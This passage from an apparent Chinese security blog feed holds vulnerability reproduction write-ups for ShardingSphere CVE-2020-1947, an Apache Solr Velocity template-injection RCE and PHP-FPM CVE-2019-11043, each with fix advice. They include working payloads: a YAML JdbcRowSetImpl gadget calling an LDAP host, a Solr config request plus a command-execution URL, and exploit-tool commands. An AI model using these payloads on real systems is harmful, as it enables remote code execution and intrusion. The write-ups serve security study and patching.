SwiamF2YS5sYW5nLnJlZmxlY3QuVHlwZSI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLlR5cGVBZGFwdGVycyQzMyI6e30sIm9yZy5hcGFjaGUuc2hhcmRpbmdzcGhlcmUudWkuc2VjdXJpdHkuVXNlckF1dGhlbnRpY2F0aW9uU2VydmljZSI6e30sImJ5dGVbXSI6e30sImJ5dGUiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5PYmplY3RUeXBlQWRhcHRlciQxIjp7fSwiamF2YS5sYW5nLkludGVnZXIiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5NYXBUeXBlQWRhcHRlckZhY3RvcnkiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5Db2xsZWN0aW9uVHlwZUFkYXB0ZXJGYWN0b3J5Ijp7fSwiY29tLmdvb2dsZS5nc29uLkxvbmdTZXJpYWxpemF0aW9uUG9saWN5JDEiOnt9LCJjb20uZ29vZ2xlLmdzb24uTG9uZ1NlcmlhbGl6YXRpb25Qb2xpY3kiOnt9LCJqYXZhLmxhbmcuVGhyZWFkTG9jYWxcdTAwM2NqYXZhLnV0aWwuTWFwXHUwMDNjY29tLmdvb2dsZS5nc29uLnJlZmxlY3QuVHlwZVRva2VuXHUwMDNjP1x1MDAzZSwgY29tLmdvb2dsZS5nc29uLkdzb24kRnV0dXJlVHlwZUFkYXB0ZXJcdTAwM2M/XHUwMDNlXHUwMDNlXHUwMDNlIjp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuVHlwZUFkYXB0ZXJzJDM0Ijp7fSwiamF2YS51dGlsLkxpc3RcdTAwM2Njb20uZ29vZ2xlLmdzb24uRXhjbHVzaW9uU3RyYXRlZ3lcdTAwM2UiOnt9LCJqYXZhLmxhbmcuRG91YmxlIjp7fX0sImNvbnN0cnVjdG9yQ29uc3RydWN0b3IiOnsiaW5zdGFuY2VDcmVhdG9ycyI6e30sImFjY2Vzc29yIjp7fX0sImpzb25BZGFwdGVyRmFjdG9yeSI6eyJjb25zdHJ1Y3RvckNvbnN0cnVjdG9yIjp7Imluc3RhbmNlQ3JlYXRvcnMiOnt9LCJhY2Nlc3NvciI6e319fSwiZmFjdG9yaWVzIjpbbnVsbCxudWxsLHsidmVyc2lvbiI6LTEuMCwibW9kaWZpZXJzIjoxMzYsInNlcmlhbGl6ZUlubmVyQ2xhc3NlcyI6dHJ1ZSwicmVxdWlyZUV4cG9zZSI6ZmFsc2UsInNlcmlhbGl6YXRpb25TdHJhdGVnaWVzIjpbXSwiZGVzZXJpYWxpemF0aW9uU3RyYXRlZ2llcyI6W119LG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLHsiY29uc3RydWN0b3JDb25zdHJ1Y3RvciI6eyJpbnN0YW5jZUNyZWF0b3JzIjp7fSwiYWNjZXNzb3IiOnt9fX0seyJjb25zdHJ1Y3RvckNvbnN0cnVjdG9yIjp7Imluc3RhbmNlQ3JlYXRvcnMiOnt9LCJhY2Nlc3NvciI6e319LCJjb21wbGV4TWFwS2V5U2VyaWFsaXphdGlvbiI6ZmFsc2V9LHsiY29uc3RydWN0b3JDb25zdHJ1Y3RvciI6eyJpbnN0YW5jZUNyZWF0b3JzIjp7fSwiYWNjZXNzb3IiOnt9fX0sbnVsbCx7ImNvbnN0cnVjdG9yQ29uc3RydWN0b3IiOnsiaW5zdGFuY2VDcmVhdG9ycyI6e30sImFjY2Vzc29yIjp7fX0sImZpZWxkTmFtaW5nUG9saWN5IjoiSURFTlRJVFkiLCJleGNsdWRlciI6eyJ2ZXJzaW9uIjotMS4wLCJtb2RpZmllcnMiOjEzNiwic2VyaWFsaXplSW5uZXJDbGFzc2VzIjp0cnVlLCJyZXF1aXJlRXhwb3NlIjpmYWxzZSwic2VyaWFsaXphdGlvblN0cmF0ZWdpZXMiOltdLCJkZXNlcmlhbGl6YXRpb25TdHJhdGVnaWVzIjpbXX0sImpzb25BZGFwdGVyRmFjdG9yeSI6eyJjb25zdHJ1Y3RvckNvbnN0cnVjdG9yIjp7Imluc3RhbmNlQ3JlYXRvcnMiOnt9LCJhY2Nlc3NvciI6e319fSwiYWNjZXNzb3IiOnt9fV0sImV4Y2x1ZGVyIjp7InZlcnNpb24iOi0xLjAsIm1vZGlmaWVycyI6MTM2LCJzZXJpYWxpemVJbm5lckNsYXNzZXMiOnRydWUsInJlcXVpcmVFeHBvc2UiOmZhbHNlLCJzZXJpYWxpemF0aW9uU3RyYXRlZ2llcyI6W10sImRlc2VyaWFsaXphdGlvblN0cmF0ZWdpZXMiOltdfSwiZmllbGROYW1pbmdTdHJhdGVneSI6IklERU5USVRZIiwiaW5zdGFuY2VDcmVhdG9ycyI6e30sInNlcmlhbGl6ZU51bGxzIjpmYWxzZSwiY29tcGxleE1hcEtleVNlcmlhbGl6YXRpb24iOmZhbHNlLCJnZW5lcmF0ZU5vbkV4ZWN1dGFibGVKc29uIjpmYWxzZSwiaHRtbFNhZmUiOnRydWUsInByZXR0eVByaW50aW5nIjpmYWxzZSwibGVuaWVudCI6ZmFsc2UsInNlcmlhbGl6ZVNwZWNpYWxGbG9hdGluZ1BvaW50VmFsdWVzIjpmYWxzZSwiZGF0ZVN0eWxlIjoyLCJ0aW1lU3R5bGUiOjIsImxvbmdTZXJpYWxpemF0aW9uUG9saWN5IjoiREVGQVVMVCIsImJ1aWxkZXJGYWN0b3JpZXMiOltdLCJidWlsZGVySGllcmFyY2h5RmFjdG9yaWVzIjpbXX19</span><br><span class="line">Content-Type: application/json;charset=utf-8</span><br><span class="line">Referer: http://192.168.80.138:8088/</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 598</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;CVE-2020-1947&quot;,</span><br><span class="line">  &quot;ruleConfiguration&quot;: &quot;  encryptors:\n    encryptor_aes:\n      type: aes\n      props:\n        aes.key.value: 123456abc\n    encryptor_md5:\n      type: md5\n  tables:\n    t_encrypt:\n      columns:\n        user_id:\n          plainColumn: user_plain\n          cipherColumn: user_cipher\n          encryptor: encryptor_aes\n        order_id:\n          cipherColumn: order_cipher\n          encryptor: encryptor_md5&quot;,</span><br><span class="line">  &quot;dataSourceConfiguration&quot;: &quot;!!com.sun.rowset.JdbcRowSetImpl\n  dataSourceName: ldap://192.168.80.1:1389/ExportObject\n  autoCommit: true&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>*注意：Access-Token 要改为当前登录shardingsphere UI的token</p><p><img src="/2020/03/12/【漏洞分析&环境搭建】CVE-2020-1947_Apache_ShardingSphere UI YAML解析远程代码执行漏洞/2020-03-12-17-14-33.png" alt><br>查看服务器发现/tmp/CVE-2020-1947 文件<br><img src="/2020/03/12/【漏洞分析&环境搭建】CVE-2020-1947_Apache_ShardingSphere UI YAML解析远程代码执行漏洞/2020-03-12-17-15-26.png" alt><br>touch命令执行成功</p><h3 id="四、修复建议"><a href="#四、修复建议" class="headerlink" title="四、修复建议"></a>四、修复建议</h3><p>官方已经发布新版本<br><a href="https://github.com/apache/incubator-shardingsphere/releases" target="_blank" rel="noopener">https://github.com/apache/incubator-shardingsphere/releases</a></p><h3 id="五、附录"><a href="#五、附录" class="headerlink" title="五、附录"></a>五、附录</h3><h4 id="本次分析及复现的相关工具地址"><a href="#本次分析及复现的相关工具地址" class="headerlink" title="本次分析及复现的相关工具地址"></a>本次分析及复现的相关工具地址</h4><p><a href="https://github.com/SecurityCN/Vulnerability-analysis/tree/master/CVE-2020-1947" target="_blank" rel="noopener">https://github.com/SecurityCN/Vulnerability-analysis/tree/master/CVE-2020-1947</a></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>*<a href="https://github.com/apache/incubator-shardingsphere/releases" target="_blank" rel="noopener">https://github.com/apache/incubator-shardingsphere/releases</a><br>*<a href="https://github.com/Imanfeng/CVE-2020-1947" target="_blank" rel="noopener">https://github.com/Imanfeng/CVE-2020-1947</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;##【漏洞分析&amp;amp;环境搭建】CVE-2020-1947/Apache ShardingSphere UI YAML解析远程代码执行漏洞&lt;br&gt;&lt;img src=&quot;/2020/03/12/【漏洞分析&amp;环境搭建】CVE-2020-1947_Apache_ShardingS
      
    
    </summary>
    
    
      <category term="技术" scheme="www.ja0k.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="代码审计" scheme="www.ja0k.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="安全研究" scheme="www.ja0k.com/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
      <category term="Java-Web安全" scheme="www.ja0k.com/tags/Java-Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞复现】Apache Solr Velocity模版注入远程命令执行漏洞预警</title>
    <link href="www.ja0k.com/2019/10/31/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Apache%20Solr%20Velocity%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6/"/>
    <id>www.ja0k.com/2019/10/31/【漏洞复现】Apache Solr Velocity模版注入远程命令执行漏洞预警/</id>
    <published>2019-10-31T06:58:20.000Z</published>
    <updated>2019-10-31T08:12:22.228Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2019/10/31/【漏洞复现】Apache Solr Velocity模版注入远程命令执行漏洞预警/2019-10-31-15-23-06.png" alt></p><h4 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h4><p>2019年10月31日，国外的安全研究员S00pY在GitHub发布了Apache Solr Velocity模版注入远程命令执行的poc，经过测试该poc真实有效，漏洞等级严重，影响面广。目前Apache Solr官方未发布该漏洞的补丁。</p><h4 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table><thead><tr><th>漏洞名称</th><th>Apache Solr Velocity模版注入远程命令执行漏洞</th></tr></thead><tbody><tr><td>CVE编号</td><td>暂无</td></tr><tr><td>CNVD编号</td><td>-</td></tr><tr><td>影响版本</td><td>参考影响范围</td></tr><tr><td>威胁等级</td><td>高危</td></tr><tr><td>公开时间</td><td>2019年10月31日</td></tr></tbody></table><p>当攻击者可以直接访问Solr控制台时，可以通过发送类似/节点名/config的POST请求对该节点的配置文件做更改。Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。当设置params.resource.loader.enabled为true时，将允许用户通过设置请求中的参数来指定相关资源的加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。</p><h4 id="影响范围："><a href="#影响范围：" class="headerlink" title="影响范围："></a>影响范围：</h4><p>目前测试，影响Apache Solr 7.x到8.2.0（目前最新版本）。<br><strong>可能影响全版本Apache Solr</strong></p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p><strong>Poc</strong>：<br><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt</a></p><p>Step1：<br>访问Core Admin得到应用Path路径,此处为collection1<br><img src="/2019/10/31/【漏洞复现】Apache Solr Velocity模版注入远程命令执行漏洞预警/2019-10-31-15-05-38.png" alt><br>修改应用配置<br>solr.resource.loader.enabled 和<br>params.resource.loader.enabled为true</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/collection1/config HTTP/1.1</span><br><span class="line">Host: ip:8983</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/10/31/【漏洞复现】Apache Solr Velocity模版注入远程命令执行漏洞预警/2019-10-31-15-02-20.png" alt></p><p>Step2：<br>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8983/solr/collection1/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure><p><img src="/2019/10/31/【漏洞复现】Apache Solr Velocity模版注入远程命令执行漏洞预警/2019-10-31-14-59-18.png" alt></p><p>成功执行服务器命令</p><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>目前，官方尚未发布相关漏洞的安全补丁，请及时关注官方更新，网址：<a href="http://lucene.apache.org/solr/downloads.html" target="_blank" rel="noopener">http://lucene.apache.org/solr/downloads.html</a></p><p>参考：<br><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/2019/10/31/【漏洞复现】Apache Solr Velocity模版注入远程命令执行漏洞预警/2019-10-31-15-23-06.png&quot; alt&gt;&lt;/p&gt;
&lt;h4 id=&quot;事件背景&quot;&gt;&lt;a href=&quot;#事件背景&quot; class=&quot;hea
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>【漏洞复现】CVE-2019-11043/PHP-FPM在Nginx特定配置下远程代码执行漏洞复现及简单分析</title>
    <link href="www.ja0k.com/2019/10/23/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91CVE-2019-11043-PHP-FPM%E5%9C%A8Nginx%E7%89%B9%E5%AE%9A%E9%85%8D%E7%BD%AE%E4%B8%8B%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>www.ja0k.com/2019/10/23/【漏洞复现】CVE-2019-11043-PHP-FPM在Nginx特定配置下远程代码执行漏洞复现及简单分析/</id>
    <published>2019-10-23T13:54:41.000Z</published>
    <updated>2019-10-31T08:14:59.920Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2019/10/23/【漏洞复现】CVE-2019-11043-PHP-FPM在Nginx特定配置下远程代码执行漏洞复现及简单分析/2019-10-24-15-03-43.png" alt></p><h3 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h3><p>9月26日，PHP官方发布漏洞通告，提到Nginx与php-fpm服务器上存在的一处高危漏洞，由于Nginx的fastcgi_split_path_info模块在处理带 %0a 的请求时，对换行符 \n 处置不当使得将PATH_INFO 值置为空，从而导致可以通过FCGI_PUTENV与PHP_VALUE相结合，修改当前的php-fpm进程中的php配置。在特殊构造的配置生效的情况下可以触发任意代码执行。目前开源社区已有漏洞Poc公开。</p><h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table><thead><tr><th>漏洞名称</th><th>PHP-FPM在Nginx特定配置下远程代码执行</th></tr></thead><tbody><tr><td>CVE编号</td><td>CVE-2019-11043</td></tr><tr><td>CNVD编号</td><td>-</td></tr><tr><td>影响版本</td><td>参考影响范围</td></tr><tr><td>威胁等级</td><td>高危</td></tr><tr><td>公开时间</td><td>2019年9月26日</td></tr></tbody></table><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Nginx + php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^/]\.php(/|$) &#123;</span><br><span class="line">    fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line">    fastcgi_param PATH_INFO       $fastcgi_path_info;</span><br><span class="line">    fastcgi_pass   php:9000;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="1-编译phuip-fpizdam"><a href="#1-编译phuip-fpizdam" class="headerlink" title="1. 编译phuip-fpizdam"></a>1. 编译phuip-fpizdam</h4><p>git clone <a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">https://github.com/neex/phuip-fpizdam</a></p><p><img src="/2019/10/23/【漏洞复现】CVE-2019-11043-PHP-FPM在Nginx特定配置下远程代码执行漏洞复现及简单分析/2019-10-24-08-55-27.png" alt><br>go bulid<br>*编译需要golang环境，另外中国区最好配置goproxy.cn否则编译会出错，配置goproxy.cn命令如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go env -w GOPROXY=https://goproxy.cn,direct</span><br></pre></td></tr></table></figure><p>编译成功<br><img src="/2019/10/23/【漏洞复现】CVE-2019-11043-PHP-FPM在Nginx特定配置下远程代码执行漏洞复现及简单分析/2019-10-24-10-30-43.png" alt></p><h4 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h4><p>使用vulhub的漏洞环境 复现<br>使用以下命令构造漏洞环境（需要docker环境）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/default.conf</span><br><span class="line">wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/docker-compose.yml</span><br><span class="line">service docker start</span><br><span class="line">docker-compose up -d</span><br><span class="line">wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/www/index.php</span><br><span class="line">docker cp index.php cve201911043_php_1:/var/www/html/inex.php</span><br></pre></td></tr></table></figure><p>/etc/nginx/conf.d/default.conf 配置如下，vulhub的环境nginx配置已更改，使用此环境无需再改<br><img src="/2019/10/23/【漏洞复现】CVE-2019-11043-PHP-FPM在Nginx特定配置下远程代码执行漏洞复现及简单分析/2019-10-24-14-54-36.png" alt></p><p>在浏览器打开<br><a href="http://192.168.80.132/index.php" target="_blank" rel="noopener">http://192.168.80.132/index.php</a><br><img src="/2019/10/23/【漏洞复现】CVE-2019-11043-PHP-FPM在Nginx特定配置下远程代码执行漏洞复现及简单分析/2019-10-24-11-05-19.png" alt></p><h4 id="3-Poc测试"><a href="#3-Poc测试" class="headerlink" title="3.Poc测试"></a>3.Poc测试</h4><p><strong>漏洞攻击</strong><br>使用编译成功的phuip-fpizdam测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phuip-fpizdam http://192.168.80.132/index.php</span><br></pre></td></tr></table></figure><p><img src="/2019/10/23/【漏洞复现】CVE-2019-11043-PHP-FPM在Nginx特定配置下远程代码执行漏洞复现及简单分析/2019-10-24-11-05-38.png" alt><br>在浏览器访问：<br><a href="http://192.168.80.132:8080/index.php?a=id" target="_blank" rel="noopener">http://192.168.80.132:8080/index.php?a=id</a><br><img src="/2019/10/23/【漏洞复现】CVE-2019-11043-PHP-FPM在Nginx特定配置下远程代码执行漏洞复现及简单分析/2019-10-24-11-06-20.png" alt><br>可以执行系统命令,id可以替换为其他OS命令</p><p><strong>漏洞检测</strong><br>可以采用phuip-fpizdam 的 –skip-attack 参数进行无害的漏洞检测，命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phuip-fpizdam http://192.168.80.132:8080/index.php --skip-attack</span><br></pre></td></tr></table></figure><p><img src="/2019/10/23/【漏洞复现】CVE-2019-11043-PHP-FPM在Nginx特定配置下远程代码执行漏洞复现及简单分析/2019-10-24-18-02-49.png" alt></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>PHP-FPM(PHP FastCGI Process Manager)意：PHP FastCGI 进程管理器，用于管理PHP 进程池的软件，用于接受web服务器的请求。</p><h4 id="1-nginx与php-fpm结合的处理流程"><a href="#1-nginx与php-fpm结合的处理流程" class="headerlink" title="1.nginx与php-fpm结合的处理流程"></a>1.nginx与php-fpm结合的处理流程</h4><p>打开php-fpm.conf文件，我们看到如下配置：<br><img src="/2019/10/23/【漏洞复现】CVE-2019-11043-PHP-FPM在Nginx特定配置下远程代码执行漏洞复现及简单分析/2019-10-24-14-50-31.png" alt><br>即:php-fpm模块监听127.0.0.1:9000端口，等待请求到来去处理。</p><p>Fast和Nginx，PHP的关系图<br><img src="/2019/10/23/【漏洞复现】CVE-2019-11043-PHP-FPM在Nginx特定配置下远程代码执行漏洞复现及简单分析/2019-10-24-14-59-34.png" alt></p><p>处理过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">www.example.com</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">      Nginx</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">路由到www.example.com/index.php</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">加载nginx的fast-cgi模块</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">fast-cgi监听127.0.0.1:9000地址</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">www.example.com/index.php请求到达127.0.0.1:9000</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">php-fpm 监听127.0.0.1:9000</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">php-fpm 接收到请求，启用worker进程处理请求</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">php-fpm 处理完请求，返回给nginx</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">nginx将结果通过http返回给浏览器</span><br></pre></td></tr></table></figure><h4 id="2-漏洞触发点"><a href="#2-漏洞触发点" class="headerlink" title="2.漏洞触发点"></a>2.漏洞触发点</h4><p>因为“fpm_main.c”文件的第1150行代码中由于\n(%0a)的传入导致nginx传递给php-fpm的PATH_INFO为空。<br><a href="https://github.com/php/php-src/blob/master/sapi/fpm/fpm/fpm_main.c#L1150" target="_blank" rel="noopener">https://github.com/php/php-src/blob/master/sapi/fpm/fpm/fpm_main.c#L1150</a><br><img src="/2019/10/23/【漏洞复现】CVE-2019-11043-PHP-FPM在Nginx特定配置下远程代码执行漏洞复现及简单分析/2019-10-24-14-51-44.png" alt><br>进而导致可以通过FCGI_PUTENV与PHP_VALUE相结合，修改当前的php-fpm进程中的php配置。在特殊构造的配置生效的情况下可以触发任意代码执行。</p><h4 id="3-此漏洞利用的先决条件："><a href="#3-此漏洞利用的先决条件：" class="headerlink" title="3.此漏洞利用的先决条件："></a>3.此漏洞利用的先决条件：</h4><p>1.php需要开启FPM模块，该模块在php虽然在PHP5.3.3之后已经加入php核心代码但是的PHP的发行版默认不安装php-fpm模块，所有默认的用户不受影响；要想php支持php-fpm，只需要在编译php源码的时候带上–enable-fpm；<br>2.需要修改/nginx/conf/nginx.conf配置；<br>故此该漏洞远程利用起来还是很难的，大家不必惊慌！！</p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>1.修改nginx配置文件中fastcgi_split_path_info的正则表达式,不允许.php之后传入不可显字符<br>2.暂停使用 nginx+php-fpm 服务<br>根据自己实际生产环境的业务需求，将以下配置删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line">fastcgi_param PATH_INFO  $fastcgi_path_info;</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[1].<a href="https://bugs.php.net/bug.php?id=78599" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78599</a><br>[2].<a href="https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043</a><br>[3].<a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">https://github.com/neex/phuip-fpizdam</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/2019/10/23/【漏洞复现】CVE-2019-11043-PHP-FPM在Nginx特定配置下远程代码执行漏洞复现及简单分析/2019-10-24-15-03-43.png&quot; alt&gt;&lt;/p&gt;
&lt;h3 id=&quot;事件背景&quot;&gt;&lt;a href=&quot;#事件
      
    
    </summary>
    
    
      <category term="技术" scheme="www.ja0k.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="安全研究" scheme="www.ja0k.com/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
      <category term="Web安全" scheme="www.ja0k.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞复现】CVE-2019-14287-linux-sudo-root权限绕过</title>
    <link href="www.ja0k.com/2019/10/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91CVE-2019-14287-linux-sudo-root%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
    <id>www.ja0k.com/2019/10/15/【漏洞复现】CVE-2019-14287-linux-sudo-root权限绕过/</id>
    <published>2019-10-15T08:45:40.000Z</published>
    <updated>2019-10-31T08:17:21.609Z</updated>
    
